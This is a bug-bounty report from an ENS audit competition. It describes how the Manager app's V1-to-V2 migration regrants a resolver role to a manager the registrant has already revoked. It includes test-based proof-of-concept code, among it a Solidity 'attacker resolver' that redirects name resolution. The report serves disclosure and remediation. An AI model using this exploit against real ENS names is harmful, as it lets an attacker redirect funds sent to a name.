# 90314 w a medium migration resurrects a revoked v1 manager with v2 resolver authority

## #90314 \[W\&A-Medium] Migration resurrects a revoked V1 manager with V2 resolver authority

**Submitted on Aug 24th 2026 at 11:36:37 UTC by @y4rvin for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90314
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as:
    * a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker
    * redirecting the recipient of a name transfer
    * leaving a name permanently inaccessible after the flow

### Description

#### Summary

The Manager's V1-to-V2 migration can grant a former V1 manager a new, persistent V2 `ROLE_SET_RESOLVER` role even after the registrant has revoked that manager on-chain with V1 `BaseRegistrar.reclaim`.

The application first derives `managerAddress` from a V1 subgraph snapshot. Its execution-time eligibility checks read the current BaseRegistrar token owner and V2 reservation status, but never read the current V1 Registry owner that defines the legacy manager. The authority-bearing migration plan is cached under a key derived from wallet/HCA/domain IDs rather than mutable owner/manager content. Consequently, even a normal focus refresh can update the raw V1 domain to the current owner while the settled same-ID migration plan retains `grantRoles(formerManager)`.

The normal migration batch then migrates the name and calls the V2 ETH Registry to grant that stale address `ROLE_SET_RESOLVER`. The grant survives cleanup of the HCA's temporary operator approval. The revoked account can independently replace the resolver with an attacker-controlled resolver.

#### Security invariant

Every V2 manager role granted during migration must correspond to the current V1 Registry owner at the execution authorization snapshot. The current implementation instead binds the grant to an earlier subgraph/derived-plan snapshot.

#### Root cause

1. `packages/migration/src/service/classifyNames.ts:148-167` copies `domain.owner` into `managerAddress` for an unwrapped `.eth` name when it differs from the registrant.
2. `packages/migration/src/service/preflightChecks.ts:47-102,140-226` and `apps/manager/src/features/migration/service/computeMigrationPreflight.ts:192-259` validate BaseRegistrar ownership and V2 status, but do not read the live V1 Registry owner.
3. `apps/manager/src/features/migration/hooks/useMigrationGasEstimate.ts:62-109` keys the derived plan by wallet, HCA, sorted domain IDs and an ID-derived selection revision. A manager/owner change for the same domain does not change that identity.
4. `apps/manager/src/features/migration/service/migrationService.ts:886-928` refreshes route and resolver information when rebuilding work, but preserves the already classified names.
5. `apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-624,737-780` emits the role grant, and `verifyAtomicMigrationBatch.ts:337-353` treats that stale grantee as the expected successful post-state.

#### Attack scenario

{% stepper %}
{% step %}

### Load a migration plan with a delegated V1 manager

At T0, the victim's unwrapped `.eth` name has a delegated V1 manager. The Manager loads the name and constructs a migration plan containing that address.
{% endstep %}

{% step %}

### Revoke the manager before migration

Before migration execution, the registrant revokes the manager on-chain using `BaseRegistrar.reclaim`, so the former manager no longer controls the V1 Registry node.
{% endstep %}

{% step %}

### Continue from the existing session

The victim continues the normal migration from the existing session. A focus/visibility refresh can fetch the new raw owner, but the same-ID migration-plan query remains settled with the old manager grant unless that separate query is explicitly invalidated.
{% endstep %}

{% step %}

### Sign the migration batch

The victim signs the ordinary migration batch. It migrates the name and grants the revoked address V2 `ROLE_SET_RESOLVER`.
{% endstep %}

{% step %}

### Replace the resolver

After the app removes the HCA's temporary operator approval, the former manager's direct role remains. The attacker calls `setResolver` and installs a resolver returning an attacker-controlled recipient.
{% endstep %}
{% endstepper %}

The attacker does not need the victim's key or a compromised subgraph. The subgraph result may have been correct at T0; the defect is the app's failure to bind a new authority grant to current on-chain V1 manager state at execution.

#### Impact

The former manager gains unauthorized, persistent-until-revoked control over name resolution and can redirect ENS resolution to attacker-controlled destinations. This matches the competition's Critical example of a Manager migration assigning a resolver to an attacker.

The demonstrated impact is intentionally bounded:

* ownership remains with the legitimate wallet;
* the attacker receives only the normal resolver role, not its admin role;
* the owner can recover by first revoking the former manager's role and then resetting the resolver;
* revocation alone does not restore a resolver the attacker already installed;
* the Manager UI neither names the restored grantee in its generic confirmation copy nor exposes a general manager-revocation flow, so recovery requires detection and separate owner action;
* the PoC proves resolver replacement and an attacker-controlled resolved recipient, but does not execute a third-party token transfer;
* the frozen release notes say the public migration rollout flag is disabled. This is a scoped pre-release competition path, not a claim of current public-mainnet exploitation or historical victims.

#### Reproduction summary

The attached PoC field contains four self-contained regression tests and exact commands. The three TypeScript tests run on the frozen app revision `cda79acaad59711b943fc68207ebb3f1d0ff8596`. Source semantics were also checked at contracts pin `8d9dcca8a7703e5d15958d628c39579d3aa789e1`; the Solidity integration test itself runs on the HCA-aware PR #402 revision `5bbe6add1192c635215031e0b3f20d1e517959e5`.

The clean replay produced `10 passed, 0 failed`:

* app classification/calldata: 3 baseline/attack/refreshed-negative tests;
* live eligibility omission: 1 test;
* focus/raw-refresh/derived-plan behavior: 3 baseline/attack/invalidation-negative tests;
* real PR #402 helper, factory-certified HCA, V1 and V2 contracts: 3 baseline/attack/refreshed-negative tests.

The proof is an explicit two-part composition. The TypeScript tests execute the real scoped hooks, classification and batch builders and decode the exact `grantRoles` target/resource/role/grantee. The Solidity integration test executes the identical security-relevant call through the real helper, certified HCA and V1/V2 contract implementations. No mock translates the authority semantics across that boundary.

The frozen app config points to Sepolia helper `0xddC597d937618849348E18Db5D631Ce747bCDeEF`. A read-only check at block `11551615` measured runtime keccak `0x0b8acb00c2912a8b43085e0f55f9459b956cb51be1a16a5ff7ef0346dbd18143`, equal to the app's pinned invariant. No live state-changing call was made.

#### Recommended remediation

Immediately before emitting or authorizing each manager-role grant, read the current V1 Registry owner and either rebuild the disclosed plan or fail closed when it differs from the snapshot. Include an authority fingerprint (at least current V1 owner/manager, and preferably resolver state) in the derived-plan query identity and invalidate/rebuild the plan when that content changes. Show the exact grantee to the user. A contract-side expected-manager binding would close the residual app/subgraph race more robustly than UI refetching alone.

### Proof of Concept

## Reproduction

The proof uses the frozen competition repository and the exact public PR #402 contract revision. No live state-changing transaction is required.

{% stepper %}
{% step %}

### App repository

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git
cd audit-comp-ens
git checkout cda79acaad59711b943fc68207ebb3f1d0ff8596
pnpm install
```

Add the following three test files at the stated paths.

#### `apps/manager/src/features/migration/service/staleManagerMigration.poc.test.ts`

```ts
import {
  type Address,
  decodeFunctionData,
  getAddress,
} from 'viem'
import { sepolia } from 'viem/chains'
import { assert, describe, expect, it } from 'vitest'

import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { makeDomain, OWNER } from './_fixtures'
import { buildAtomicMigrationBatches } from './buildAtomicMigrationBatches'
import {
  type ClassifiedName,
  classifyName,
} from './classifyNames'
import type { DirectMigrationRoute } from './directMigrationRoutes'

const HCA: Address = '0x00000000000000000000000000000000000000a1'
const REVOKED_MANAGER: Address =
  '0x00000000000000000000000000000000000000c1'
const DEFAULT_RESOLVER: Address =
  '0x00000000000000000000000000000000000000d1'
const ROLE_SET_RESOLVER = 1n << 24n

const classify = (ownerId: Address): ClassifiedName => {
  const result = classifyName(
    makeDomain({
      ownerId,
      registrantId: OWNER,
      resolverAddress: null,
    }),
    OWNER,
  )
  assert(result?.type === 'classified')
  return result.name
}

const buildRoute = (name: ClassifiedName): DirectMigrationRoute => ({
  name: name.domain.name,
  receiver: V2_CONTRACTS.UnlockedMigrationController,
  parentDependency: null,
  expectedWrapperRegistry: null,
  receiverReadiness: 'migration-controller',
})

const buildPlan = (name: ClassifiedName) =>
  buildAtomicMigrationBatches({
    chainId: sepolia.id,
    hca: HCA,
    wallet: OWNER,
    classified: [name],
    directRoutes: new Map([[name.domain.name, buildRoute(name)]]),
    profiles: new Map(),
    defaultResolver: DEFAULT_RESOLVER,
    resolverDeployed: true,
    walletCoAdminGranted: true,
    maxOuterGas: 1_000_000n,
    estimateOuterGas: () => 300_000n,
  })

const decodeManagerGrant = async (name: ClassifiedName) => {
  const plan = await buildPlan(name)
  const batch = plan.batches[0]
  assert(batch)
  const execution = batch.innerExecutions.find(
    ({ phase }) => phase === 'manager-role-grant',
  )
  if (!execution) return null
  const decoded = decodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI,
    data: execution.call.data,
  })
  assert(decoded.functionName === 'grantRoles')
  return {
    target: execution.call.to,
    resource: decoded.args[0],
    roles: decoded.args[1],
    account: decoded.args[2],
  }
}

describe('CAND-005 stale V1 manager restoration', () => {
  it('baseline: restores a manager that is still current in the V1 registry', async () => {
    const name = classify(REVOKED_MANAGER)

    expect(await decodeManagerGrant(name)).toMatchObject({
      target: V2_CONTRACTS.ETHRegistry,
      roles: ROLE_SET_RESOLVER,
      account: getAddress(REVOKED_MANAGER),
    })
  })

  it('attack: converts a stale subgraph owner into a persistent resolver-role grant', async () => {
    const staleName = classify(REVOKED_MANAGER)

    expect(staleName.managerAddress).toBe(REVOKED_MANAGER)
    expect(await decodeManagerGrant(staleName)).toMatchObject({
      roles: ROLE_SET_RESOLVER,
      account: getAddress(REVOKED_MANAGER),
    })
  })

  it('negative control: a refreshed V1 registry owner removes the manager grant', async () => {
    const refreshedName = classify(OWNER)

    expect(refreshedName.managerAddress).toBeNull()
    expect(await decodeManagerGrant(refreshedName)).toBeNull()
  })
})
```

#### `packages/migration/src/service/staleManagerEligibility.poc.test.ts`

```ts
import type { Address } from 'viem'
import { multicall } from 'viem/actions'
import { beforeEach, describe, expect, it, vi } from 'vitest'

import { makeClassified, ok, OWNER, publicClient } from './_fixtures'
import { runEligibilityChecks } from './preflightChecks'

vi.mock('viem/actions', () => ({
  multicall: vi.fn(),
}))

const REVOKED_MANAGER: Address =
  '0x00000000000000000000000000000000000000c1'
const multicallMock = vi.mocked(multicall)

describe('CAND-005 stale manager eligibility', () => {
  beforeEach(() => {
    multicallMock.mockReset()
  })

  it('keeps managerAddress after every live eligibility check succeeds without reading the V1 registry owner', async () => {
    const staleName = makeClassified({
      id: '0xa1',
      labelhash: '0xa1',
      managerAddress: REVOKED_MANAGER,
    })
    multicallMock
      .mockResolvedValueOnce([ok(OWNER)])
      .mockResolvedValueOnce([ok(1)])

    const result = await runEligibilityChecks(
      publicClient,
      [staleName],
      OWNER,
    )
    const observedFunctions = multicallMock.mock.calls.flatMap(
      ([, parameters]) =>
        (parameters.contracts as readonly { readonly functionName: string }[]).map(
          ({ functionName }) => functionName,
        ),
    )

    expect(result.eligible).toEqual([staleName])
    expect(result.eligible[0]?.managerAddress).toBe(REVOKED_MANAGER)
    expect(observedFunctions).toEqual(['ownerOf', 'getStatus'])
    expect(observedFunctions).not.toContain('owner')
  })
})
```

#### `apps/manager/src/features/migration/hooks/staleManagerDerivedPlan.poc.test.tsx`

```tsx
import {
  focusManager,
  QueryClient,
  QueryClientProvider,
} from '@tanstack/react-query'
import { act, renderHook, waitFor } from '@testing-library/react'
import { ok } from 'neverthrow'
import type { ReactNode } from 'react'
import { type Address, decodeFunctionData, getAddress } from 'viem'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { V2_CONTRACTS } from '../contracts/addresses'
import { makeDomain, OWNER } from '../service/_fixtures'
import type { DirectMigrationRoute } from '../service/directMigrationRoutes'

const smartAccountMock = vi.hoisted(() => ({
  useSmartAccountContext: vi.fn(),
}))

const wagmiMock = vi.hoisted(() => ({
  createConfig: vi.fn(() => ({ getClient: vi.fn() })),
  mock: vi.fn(() => ({})),
  useConfig: vi.fn(),
  useConnection: vi.fn(),
  usePublicClient: vi.fn(),
}))

const v1SubgraphMock = vi.hoisted(() => ({
  getV1NamesForAddress: vi.fn(),
}))

const migrationMock = vi.hoisted(() => ({
  computeMigrationPreflight: vi.fn(),
  estimateMigrationGasCost: vi.fn(),
}))

vi.mock('@/lib/smart-account', () => smartAccountMock)
vi.mock('wagmi', () => wagmiMock)
vi.mock('wagmi/connectors', () => ({
  walletConnect: vi.fn(() => ({})),
}))
vi.mock('@ens-apps/smart-account', async () => {
  const manifest = await import(
    '../../../../../../packages/smart-account/src/providers/rhinestone/manifest'
  )
  const ownerExecution = await import(
    '../../../../../../packages/smart-account/src/providers/rhinestone/owner-execution'
  )
  return {
    buildHcaOwnerExecutionCall: ownerExecution.buildHcaOwnerExecutionCall,
    computeResolverAddress: () =>
      '0x00000000000000000000000000000000000000d1' as Address,
    computeResolverSalt: manifest.computeResolverSalt,
    getDestinationContracts: manifest.getDestinationContracts,
    ROLES_ALL: manifest.ROLES_ALL,
  }
})
vi.mock('@/features/migration/service/v1SubgraphClient', () => v1SubgraphMock)
vi.mock('@/features/migration/service/computeMigrationPreflight', () => ({
  computeMigrationPreflight: migrationMock.computeMigrationPreflight,
  EMPTY_PREFLIGHT: {
    preExistingOwnedPermRes: null,
    skipApprovalPhase: false,
    skipFetchProfilesPhase: false,
    baseRegistrarApproved: false,
    nameWrapperApproved: false,
  },
}))
vi.mock('@/features/migration/service/estimateMigrationGasCost', () => ({
  estimateMigrationGasCost: migrationMock.estimateMigrationGasCost,
}))

import { useMigrationGasEstimate } from './useMigrationGasEstimate'
import { useV1Names } from './useV1Names'

const HCA: Address = '0x00000000000000000000000000000000000000a1'
const FORMER_MANAGER: Address = '0x00000000000000000000000000000000000000c1'
const staleDomain = makeDomain({
  ownerId: FORMER_MANAGER,
  registrantId: OWNER,
  resolverAddress: null,
})
const refreshedDomain = makeDomain({
  ownerId: OWNER,
  registrantId: OWNER,
  resolverAddress: null,
})
const directRoute: DirectMigrationRoute = {
  name: staleDomain.name,
  receiver: V2_CONTRACTS.UnlockedMigrationController,
  parentDependency: null,
  expectedWrapperRegistry: null,
  receiverReadiness: 'migration-controller',
}

const createHarness = () => {
  const queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false, staleTime: 0 } },
  })
  const Wrapper = ({ children }: { children: ReactNode }) => (
    <QueryClientProvider client={queryClient}>{children}</QueryClientProvider>
  )
  return { queryClient, Wrapper }
}

const useSubject = () => {
  const v1Names = useV1Names()
  const gasEstimate = useMigrationGasEstimate({
    ownerAddress: OWNER,
    hcaAddress: HCA,
    selectedNames: [staleDomain.name],
    v1Names: v1Names.data ?? [],
  })
  return { gasEstimate, v1Names }
}

const planOwner = (subject: ReturnType<typeof useSubject>) => {
  if (subject.gasEstimate.status !== 'ready') return undefined
  return subject.gasEstimate.plan.domains[0]?.owner?.id
}

const managerGrantAccount = (subject: ReturnType<typeof useSubject>) => {
  if (subject.gasEstimate.status !== 'ready') return undefined
  const execution = subject.gasEstimate.plan.atomicBatches
    .flatMap(({ innerExecutions }) => innerExecutions)
    .find(({ phase }) => phase === 'manager-role-grant')
  if (!execution) return null
  const decoded = decodeFunctionData({
    abi: ETH_REGISTRY_V2_ABI,
    data: execution.call.data,
  })
  expect(decoded.functionName).toBe('grantRoles')
  return decoded.args[2]
}

describe('CAND-005 stale manager derived migration plan', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    focusManager.setFocused(true)
    smartAccountMock.useSmartAccountContext.mockReturnValue({
      ownerAddress: OWNER,
    })
    wagmiMock.useConnection.mockReturnValue({ address: OWNER })
    wagmiMock.useConfig.mockReturnValue({})
    wagmiMock.usePublicClient.mockReturnValue({ chain: { id: 11155111 } })
    migrationMock.computeMigrationPreflight.mockResolvedValue({
      preExistingOwnedPermRes: null,
      skipApprovalPhase: true,
      skipFetchProfilesPhase: true,
      baseRegistrarApproved: false,
      nameWrapperApproved: false,
      directMigrationRoutes: new Map([[staleDomain.name, directRoute]]),
    })
    migrationMock.estimateMigrationGasCost.mockResolvedValue({
      status: 'ready',
      gasUnits: 1n,
      feeWei: 1n,
      feePerGasWei: 1n,
      transactionCount: 1,
    })
  })

  afterEach(() => {
    focusManager.setFocused(undefined)
  })

  it('baseline: a current manager remains in the derived migration plan', async () => {
    v1SubgraphMock.getV1NamesForAddress.mockReturnValue(ok([staleDomain]))
    const { Wrapper } = createHarness()
    const { result } = renderHook(useSubject, { wrapper: Wrapper })

    await waitFor(() => {
      expect(result.current.gasEstimate.status).toBe('ready')
    })
    expect(planOwner(result.current)).toBe(FORMER_MANAGER)
    expect(managerGrantAccount(result.current)).toBe(getAddress(FORMER_MANAGER))
  })

  it('attack: focus refreshes V1 data but the same-ID derived plan retains the revoked manager', async () => {
    v1SubgraphMock.getV1NamesForAddress
      .mockReturnValueOnce(ok([staleDomain]))
      .mockReturnValue(ok([refreshedDomain]))
    const { queryClient, Wrapper } = createHarness()
    const { result } = renderHook(useSubject, { wrapper: Wrapper })

    await waitFor(() => {
      expect(result.current.gasEstimate.status).toBe('ready')
      expect(result.current.v1Names.data).toEqual([staleDomain])
    })

    act(() => focusManager.setFocused(false))
    act(() => focusManager.setFocused(true))

    await waitFor(() => {
      expect(result.current.v1Names.data).toEqual([refreshedDomain])
      expect(result.current.v1Names.isFetching).toBe(false)
      expect(
        queryClient.isFetching({ queryKey: ['migration-gas-estimate'] }),
      ).toBe(0)
    })

    expect(v1SubgraphMock.getV1NamesForAddress).toHaveBeenCalledTimes(2)
    expect(refreshedDomain.id).toBe(staleDomain.id)
    expect(planOwner(result.current)).toBe(FORMER_MANAGER)
    expect(managerGrantAccount(result.current)).toBe(getAddress(FORMER_MANAGER))
  })

  it('negative control: invalidating the derived-plan query after the V1 refresh removes the manager', async () => {
    v1SubgraphMock.getV1NamesForAddress
      .mockReturnValueOnce(ok([staleDomain]))
      .mockReturnValue(ok([refreshedDomain]))
    const { queryClient, Wrapper } = createHarness()
    const { result } = renderHook(useSubject, { wrapper: Wrapper })

    await waitFor(() => expect(result.current.gasEstimate.status).toBe('ready'))
    act(() => focusManager.setFocused(false))
    act(() => focusManager.setFocused(true))
    await waitFor(() =>
      expect(result.current.v1Names.data).toEqual([refreshedDomain]),
    )

    await queryClient.invalidateQueries({
      queryKey: ['migration-gas-estimate'],
    })
    await waitFor(() => {
      expect(planOwner(result.current)).toBe(OWNER)
      expect(managerGrantAccount(result.current)).toBeNull()
    })
  })
})
```

Run the three app tests:

```bash
pnpm --dir apps/manager exec vitest run src/features/migration/service/staleManagerMigration.poc.test.ts --reporter=verbose
pnpm --dir packages/migration exec vitest run src/service/staleManagerEligibility.poc.test.ts --reporter=verbose
pnpm --dir apps/manager exec vitest run src/features/migration/hooks/staleManagerDerivedPlan.poc.test.tsx --reporter=verbose
```

Expected result: `3 passed`, `1 passed`, and `3 passed`, respectively. The attack case in the third file shows that the raw V1 result is refreshed and idle while the settled plan still decodes `grantRoles(FORMER_MANAGER)`; its negative control invalidates the plan query and removes the grant.
{% endstep %}

{% step %}

### Contract integration

```bash
git clone --recurse-submodules https://github.com/ensdomains/contracts-v2.git
cd contracts-v2
git fetch origin refs/pull/402/head
git checkout --detach 5bbe6add1192c635215031e0b3f20d1e517959e5
git submodule update --init --recursive
```

Add the following file as `contracts/test/poc/CAND005IntegratedMigration.t.sol`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.27;

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {Execution} from "nexus/types/DataTypes.sol";

import {IEnhancedAccessControl} from "~src/access-control/interfaces/IEnhancedAccessControl.sol";
import {StandaloneHCAFactory} from "~src/hca/StandaloneHCAFactory.sol";
import {StandaloneSingleOwnerHCA} from "~src/hca/StandaloneSingleOwnerHCA.sol";
import {LockedMigrationController} from "~src/migration/LockedMigrationController.sol";
import {
    LockedChildren,
    MigrationHelper
} from "~src/migration/MigrationHelper.sol";
import {UnlockedMigrationController} from "~src/migration/UnlockedMigrationController.sol";
import {LibMigration} from "~src/migration/libraries/LibMigration.sol";
import {ApprovedUpgradeGate} from "~src/registry/ApprovedUpgradeGate.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {WrapperRegistry} from "~src/registry/WrapperRegistry.sol";
import {PermissionedAddressSet} from "~src/utils/PermissionedAddressSet.sol";
import {MigrationControllerFixture} from "~test/fixtures/MigrationControllerFixture.sol";
import {
    MockExecutorModule,
    MockValidatorModule
} from "~test/mocks/MockStandaloneHCAStack.sol";

contract IntegratedAttackerResolver {
    address internal immutable _recipient;

    constructor(address recipient_) {
        _recipient = recipient_;
    }

    function addr(bytes32) external view returns (address) {
        return _recipient;
    }
}

contract CAND005IntegratedMigrationTest is MigrationControllerFixture {
    string internal constant LABEL = "alice";

    UnlockedMigrationController internal unlockedController;
    LockedMigrationController internal lockedController;
    MigrationHelper internal helper;
    StandaloneHCAFactory internal hcaFactory;
    StandaloneSingleOwnerHCA internal hca;
    address internal formerManager;
    address internal attackerRecipient;
    IntegratedAttackerResolver internal attackerResolver;

    function setUp() public {
        deployMigrationControllerFixture();

        unlockedController = new UnlockedMigrationController(
            nameWrapper,
            address(graveyard),
            ethRegistry,
            contractNamer
        );
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTER_RESERVED,
            address(unlockedController)
        );

        PermissionedAddressSet localRegistryUpgradeSet =
            new PermissionedAddressSet(address(this));
        PermissionedAddressSet localPublicResolverSet =
            new PermissionedAddressSet(address(this));
        WrapperRegistry wrapperRegistryImpl = new WrapperRegistry(
            nameWrapper,
            address(graveyard),
            verifiableFactory,
            address(ensV1Resolver),
            localRegistryUpgradeSet,
            labelStore,
            localPublicResolverSet,
            address(0),
            address(this)
        );
        lockedController = new LockedMigrationController(
            nameWrapper,
            address(graveyard),
            ethRegistry,
            verifiableFactory,
            address(wrapperRegistryImpl),
            localPublicResolverSet,
            address(0),
            contractNamer
        );
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTER_RESERVED,
            address(lockedController)
        );

        MockValidatorModule defaultValidator = new MockValidatorModule();
        MockExecutorModule defaultExecutor = new MockExecutorModule();
        ApprovedUpgradeGate upgradeGate = new ApprovedUpgradeGate(address(this));
        StandaloneSingleOwnerHCA hcaImplementation = new StandaloneSingleOwnerHCA(
            makeAddr("entryPoint"),
            address(defaultValidator),
            address(defaultExecutor),
            "",
            upgradeGate,
            ApprovedUpgradeGate(address(0))
        );
        hcaFactory = new StandaloneHCAFactory(verifiableFactory, address(this));
        hcaFactory.setImplementationApproval(address(hcaImplementation), true);
        hca = StandaloneSingleOwnerHCA(
            payable(hcaFactory.deploy(testOwner, address(hcaImplementation), 1))
        );

        helper = new MigrationHelper(
            rootRegistry,
            unlockedController,
            lockedController,
            hcaFactory,
            contractNamer
        );

        formerManager = makeAddr("formerManager");
        attackerRecipient = makeAddr("attackerRecipient");
        attackerResolver = new IntegratedAttackerResolver(attackerRecipient);
    }

    function test_baseline_currentManagerIsRestoredThroughRealBatch() external {
        (bytes32 node, ) = _registerV1WithManager();
        assertEq(registryV1.owner(node), formerManager, "current V1 manager");

        uint256 tokenIdV2 = _executeMigrationBatch(formerManager);

        vm.prank(formerManager);
        ethRegistry.setResolver(tokenIdV2, address(attackerResolver));
        assertEq(ethRegistry.getResolver(LABEL), address(attackerResolver));
    }

    function test_attack_revokedManagerIsRestoredThroughRealHelperAndHCA() external {
        (bytes32 node, uint256 tokenIdV1) = _registerV1WithManager();

        vm.prank(testOwner);
        baseRegistrar.reclaim(tokenIdV1, testOwner);
        assertEq(registryV1.owner(node), testOwner, "manager revoked before migration");

        uint256 tokenIdV2 = _executeMigrationBatch(formerManager);

        assertEq(ethRegistry.getOwner(tokenIdV2), testOwner, "wallet owns V2 name");
        assertFalse(
            ethRegistry.isApprovedForAll(testOwner, address(hca)),
            "temporary HCA operator approval cleaned"
        );
        assertTrue(
            ethRegistry.hasRoles(
                tokenIdV2,
                RegistryRolesLib.ROLE_SET_RESOLVER,
                formerManager
            ),
            "revoked manager has persistent V2 resolver role"
        );

        vm.prank(formerManager);
        ethRegistry.setResolver(tokenIdV2, address(attackerResolver));
        assertEq(ethRegistry.getResolver(LABEL), address(attackerResolver));
        assertEq(attackerResolver.addr(node), attackerRecipient);

        vm.startPrank(testOwner);
        ethRegistry.revokeRoles(
            tokenIdV2,
            RegistryRolesLib.ROLE_SET_RESOLVER,
            formerManager
        );
        ethRegistry.setResolver(tokenIdV2, address(0));
        vm.stopPrank();
        assertFalse(
            ethRegistry.hasRoles(
                tokenIdV2,
                RegistryRolesLib.ROLE_SET_RESOLVER,
                formerManager
            ),
            "owner can explicitly recover"
        );
    }

    function test_negative_refreshedSnapshotDoesNotRestoreRevokedManager() external {
        (bytes32 node, uint256 tokenIdV1) = _registerV1WithManager();
        vm.prank(testOwner);
        baseRegistrar.reclaim(tokenIdV1, testOwner);
        assertEq(registryV1.owner(node), testOwner, "fresh manager is registrant");

        uint256 tokenIdV2 = _executeMigrationBatch(address(0));

        vm.expectRevert(
            abi.encodeWithSelector(
                IEnhancedAccessControl.EACUnauthorizedAccountRoles.selector,
                tokenIdV2,
                RegistryRolesLib.ROLE_SET_RESOLVER,
                formerManager
            )
        );
        vm.prank(formerManager);
        ethRegistry.setResolver(tokenIdV2, address(attackerResolver));
    }

    function _registerV1WithManager() internal returns (bytes32 node, uint256 tokenIdV1) {
        bytes memory name;
        (name, tokenIdV1) = registerUnwrapped(LABEL);
        node = NameCoder.namehash(name, 0);
        vm.prank(testOwner);
        registryV1.setOwner(node, formerManager);
    }

    function _executeMigrationBatch(address manager)
        internal
        returns (uint256 tokenIdV2)
    {
        vm.startPrank(testOwner);
        baseRegistrar.setApprovalForAll(address(helper), true);
        ethRegistry.setApprovalForAll(address(hca), true);
        vm.stopPrank();

        LibMigration.Data[] memory unwrapped = new LibMigration.Data[](1);
        unwrapped[0] = LibMigration.Data({
            label: LABEL,
            owner: testOwner,
            subregistry: IRegistry(address(0)),
            resolver: address(0)
        });
        LibMigration.Data[][] memory emptyGroups = new LibMigration.Data[][](0);
        LockedChildren[] memory emptyChildren = new LockedChildren[](0);

        uint256 executionCount = manager == address(0) ? 1 : 2;
        Execution[] memory executions = new Execution[](executionCount);
        executions[0] = Execution({
            target: address(helper),
            value: 0,
            callData: abi.encodeCall(
                MigrationHelper.migrate,
                (unwrapped, emptyGroups, emptyGroups, emptyChildren)
            )
        });
        if (manager != address(0)) {
            executions[1] = Execution({
                target: address(ethRegistry),
                value: 0,
                callData: abi.encodeCall(
                    ethRegistry.grantRoles,
                    (
                        uint256(keccak256(bytes(LABEL))),
                        RegistryRolesLib.ROLE_SET_RESOLVER,
                        manager
                    )
                )
            });
        }

        vm.prank(testOwner);
        hca.executeByOwner(executions);

        vm.prank(testOwner);
        ethRegistry.setApprovalForAll(address(hca), false);
        tokenIdV2 = ethRegistry.getTokenId(uint256(keccak256(bytes(LABEL))));
    }
}
```

Run:

```bash
forge test --root contracts --match-path test/poc/CAND005IntegratedMigration.t.sol -vv
```

Expected result:

```
[PASS] test_attack_revokedManagerIsRestoredThroughRealHelperAndHCA()
[PASS] test_baseline_currentManagerIsRestoredThroughRealBatch()
[PASS] test_negative_refreshedSnapshotDoesNotRestoreRevokedManager()
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

The attack assertion sequence proves that V1 `reclaim` has already revoked the former manager, the real helper/HCA batch regrants V2 `ROLE_SET_RESOLVER`, HCA operator cleanup does not remove that direct role, and the former manager installs a resolver returning the attacker recipient. The negative control omits the refreshed-out manager and the identical resolver call reverts.
{% endstep %}
{% endstepper %}
